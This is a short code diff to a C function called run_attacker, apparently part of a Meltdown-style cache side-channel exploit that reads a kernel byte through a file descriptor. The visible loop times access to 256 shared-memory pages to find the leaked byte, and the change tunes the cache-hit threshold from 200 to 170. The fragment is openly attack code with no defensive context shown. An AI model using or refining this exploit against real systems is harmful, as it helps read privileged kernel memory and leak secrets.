@@ -71,7 +71,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 			for (int block = 0; block < 256; block++){
 				int time_req = 0;
 				time_req = time_access(shared_memory + 4096*block);
-				if (time_req < 200){
+				if (time_req < 170){
 					printf("Access time for block %c is %d\n", (char)block, time_req);
 					leaked_byte = (char)block;
 					iters++;
